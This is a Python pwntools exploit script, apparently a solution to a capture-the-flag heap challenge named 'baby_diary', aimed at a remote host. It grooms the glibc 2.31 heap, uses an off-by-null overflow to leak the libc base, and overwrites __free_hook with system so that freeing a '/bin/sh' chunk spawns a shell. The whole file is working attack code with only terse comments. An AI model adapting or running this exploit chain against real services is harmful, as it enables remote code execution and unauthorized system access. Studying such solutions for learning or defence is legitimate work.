from pwn import *

p = remote('8.140.114.72','1399')
#p = process('./baby_diary')
elf = ELF('./baby_diary')
#libc = elf.libc
libc = ELF('./libc-2.31.so')

def write(size,con):
    p.sendlineafter('>> ',str(1))
    p.sendlineafter('size: ',str(size))
    p.sendlineafter('content: ',con)

def read(idx):
    p.sendlineafter('>> ',str(2))
    p.sendlineafter('index: ',str(idx))

def delete(idx):
    p.sendlineafter('>> ',str(3))
    p.sendlineafter('index: ',str(idx))

context.log_level = 'debug'

for i in range(6):
    write(0x1000,b'\x00') #0-5
write(0x1000-0x4b0+0x70,b'\x00') #6
for i in range(7):
    write(0x27,'A') #7-13


write(0xb20,'\x00') #14
write(0x10,'\x00')  #15
delete(14)

write(0x1020,'\x00') #14
write(0x27, p64(0x6) + p64(0x601) + p8(0x40)) # idx:16 get a chunk from largebin


write(0x27,'a') #17
write(0x27,'b') #18
write(0x27,'') #19

write(0x27,'d') #20

# fill in tcache_entry[1](size: 0x30)
for i in range(7): # 7-13
    delete(7 + i)
delete(19)
delete(17)
for i in range(7):
    write(0x27,'A') #7-13
write(0x400-0x20+0x100,'A') #17
write(0x27,p64(0)+p8(0x20)) #19

# clear chunk from tcache
write(0x27, 'clear') # 20

for i in range(7): # 7-13
    delete(7 + i)

# free to fastbin
delete(18)
delete(16)

for i in range(7): # 7-13
    write(0x27, '\n')

# change fake chunk's bk->fd
write(0x27, p8(0x20)) #16
write(0x27, '\xFF'*0x4) #18
#gdb.attach(p)

write(0x27, "a") # 22 overwrite

write(0x400+0x20, "a") # 23 trigger off-by-null
write(0x100, "padding") # 24

#gdb.attach(p)
delete(22)

# off-by-null   
write(0x27, b"\x00"*0x27)
delete(22)
write(0x27, b'\x60'+b"\x00"*0x1f) #22
#gdb.attach(p)

delete(23)
write(0x40,'a') #23
read(18)
off = 0x1ebbe0
libc_base = u64(p.recvuntil('\x7f')[-6:]+b'\x00\x00')-off
p.info('libc_base: '+hex(libc_base))

delete(0)
delete(20)
delete(21)
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+libc.sym['system']
write(0x40,b'A'*0x20+p64(0)+p64(0x31)+p64(free_hook-8)+p64(0)) #0
delete(1)
write(0x20,'A') #1
write(0x20,b'/bin/sh\x00'+p64(system)) #20
delete(20)

#gdb.attach(p)
p.interactive()
